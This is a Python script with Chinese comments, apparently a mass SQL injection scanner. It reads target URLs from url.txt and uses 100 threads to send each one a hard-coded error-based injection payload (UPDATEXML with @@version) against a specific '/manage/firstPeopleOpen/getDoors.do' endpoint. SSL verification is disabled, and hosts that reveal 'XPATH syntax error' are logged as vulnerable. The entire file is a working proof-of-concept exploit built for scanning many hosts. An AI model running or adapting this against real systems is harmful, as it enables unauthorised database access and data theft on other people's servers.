import requests
import threading
import queue
from urllib.parse import urljoin
import sys
import os

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

# 线程锁
file_lock = threading.Lock()
print_lock = threading.Lock()

# Poc payload
POC_PAYLOAD = "/manage/firstPeopleOpen/getDoors.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))"

def check_vulnerability(url, thread_id):
    """
    检查单个URL的漏洞
    """
    try:
        # 构建完整的请求URL
        target_url = urljoin(url.rstrip('/') + '/', POC_PAYLOAD.lstrip('/'))
        
        # 提取Host头
        if '//' in url:
            host = url.split('//')[1].split('/')[0]
        else:
            host = url.split('/')[0]
        
        headers = {
            'Host': host,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # 发送请求，禁用SSL验证
        response = requests.get(
            target_url, 
            headers=headers,
            verify=False,
            timeout=10,
            allow_redirects=False  # 禁止重定向
        )
        
        # 检查状态码
        if 300 <= response.status_code < 400:
            with print_lock:
                print(f"[线程{thread_id}] {url} -> 状态码 {response.status_code} (3xx重定向)，漏洞不存在")
            return
        
        # 检查漏洞条件
        if response.status_code == 200 and "XPATH syntax error" in response.text:
            # 发现漏洞，立即写入结果文件
            result_info = f"漏洞存在! URL: {url}\n"
            result_info += f"目标地址: {target_url}\n"
            result_info += f"状态码: {response.status_code}\n"
            result_info += f"响应特征: 包含'XPATH syntax error'\n"
            result_info += "="*50 + "\n"
            
            with file_lock:
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(result_info)
            
            with print_lock:
                print(f"[线程{thread_id}] ✓ 发现漏洞! {url} -> 已写入result.txt")
        else:
            with print_lock:
                print(f"[线程{thread_id}] {url} -> 状态码 {response.status_code}，漏洞不存在")
                
    except requests.exceptions.RequestException as e:
        with print_lock:
            print(f"[线程{thread_id}] {url} -> 请求失败: {str(e)}")
    except Exception as e:
        with print_lock:
            print(f"[线程{thread_id}] {url} -> 发生错误: {str(e)}")

def worker(url_queue, thread_id):
    """
    工作线程函数
    """
    while True:
        try:
            url = url_queue.get_nowait()
        except queue.Empty:
            break
            
        check_vulnerability(url, thread_id)
        url_queue.task_done()

def main():
    # 检查URL文件是否存在
    if not os.path.exists("url.txt"):
        print("错误: url.txt 文件不存在!")
        return
    
    # 清空或创建结果文件
    with open("result.txt", "w", encoding="utf-8") as f:
        f.write("漏洞检测结果:\n")
        f.write("="*50 + "\n")
    
    # 读取URL列表
    with open("url.txt", "r", encoding="utf-8") as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        print("url.txt 文件中没有找到有效的URL!")
        return
    
    print(f"开始检测 {len(urls)} 个URL，线程数: 100")
    print("正在检测中...\n")
    
    # 创建队列并添加URL
    url_queue = queue.Queue()
    for url in urls:
        url_queue.put(url)
    
    # 创建并启动线程
    threads = []
    for i in range(100):
        thread = threading.Thread(target=worker, args=(url_queue, i+1))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # 等待所有任务完成
    url_queue.join()
    
    # 等待所有线程结束
    for thread in threads:
        thread.join(timeout=1)
    
    print("\n" + "="*50)
    print("检测完成!")
    
    # 检查是否有漏洞发现
    with open("result.txt", "r", encoding="utf-8") as f:
        content = f.read()
        if "漏洞存在" in content:
            print("发现存在漏洞的URL，详情请查看 result.txt")
        else:
            print("未发现存在漏洞的URL")

if __name__ == "__main__":
    main()